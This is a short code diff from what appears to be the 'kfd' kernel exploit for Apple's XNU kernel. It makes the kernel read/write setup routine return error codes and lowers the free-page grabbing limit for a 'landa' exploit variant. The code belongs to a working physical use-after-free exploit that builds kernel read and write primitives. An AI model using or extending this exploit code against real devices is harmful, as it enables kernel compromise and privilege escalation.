@@ -32,14 +32,16 @@ void krkw_init(struct kfd* kfd)
     krkw_helper_init(kfd, &kfd->kwrite);
 }
 
-void krkw_run(struct kfd* kfd)
+int krkw_run(struct kfd* kfd)
 {
-    krkw_helper_grab_free_pages(kfd);
+    if(krkw_helper_grab_free_pages(kfd))
+        return -1;
 
     krkw_helper_run_allocate(kfd, &kfd->kread);
     krkw_helper_run_allocate(kfd, &kfd->kwrite);
     krkw_helper_run_deallocate(kfd, &kfd->kread);
     krkw_helper_run_deallocate(kfd, &kfd->kwrite);
+    return 0;
 }
 
 void krkw_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
@@ -67,11 +69,13 @@ void krkw_helper_init(struct kfd* kfd, struct krkw* krkw)
     krkw->krkw_method_ops.init(kfd);
 }
 
-void krkw_helper_grab_free_pages(struct kfd* kfd)
+int krkw_helper_grab_free_pages(struct kfd* kfd)
 {
     const uint64_t copy_pages = (kfd->info.copy.size / pages(1));
     const uint64_t grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
-    const uint64_t grabbed_free_pages_max = 400000;
+    uint64_t grabbed_free_pages_max = 400000;
+    if(kfd->info.env.exploit_type == MEOW_EXPLOIT_LANDA)
+        grabbed_free_pages_max = 40000;
 
     for (uint64_t grabbed_free_pages = copy_pages; grabbed_free_pages < grabbed_free_pages_max; grabbed_free_pages += copy_pages) {
         assert_mach(vm_copy(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size, kfd->info.copy.dst_uaddr));
@@ -82,13 +86,14 @@ void krkw_helper_grab_free_pages(struct kfd* kfd)
             if (!memcmp(copy_sentinel, (void*)(puaf_page_uaddr), copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                     print_u64(grabbed_free_pages);
-                    return;
+                    return 0;
                 }
             }
         }
     }
 
     print_warning("failed to grab free pages goal");
+    return -1;
 }
 
 void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
